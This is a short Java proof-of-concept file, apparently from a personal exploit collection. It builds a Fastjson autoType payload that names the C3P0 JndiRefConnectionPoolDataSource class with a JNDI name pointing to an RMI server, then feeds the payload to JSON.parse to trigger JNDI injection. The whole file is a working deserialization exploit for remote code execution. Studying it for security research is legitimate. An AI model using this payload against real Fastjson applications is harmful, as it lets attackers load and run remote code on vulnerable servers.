package com.yyjccc.fastjson.exp;

import com.alibaba.fastjson.JSON;

public class C3P0 {
	public static void main(String[] args) {
		String data="{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\",\"jndiName\":\"rmi://127.0.0.1:8085/RFKMphyY\",\"loginTimeout\":2}";
		System.out.println(data);

		//JSON.parseObject(data);
		JSON.parse(data);

	}
}
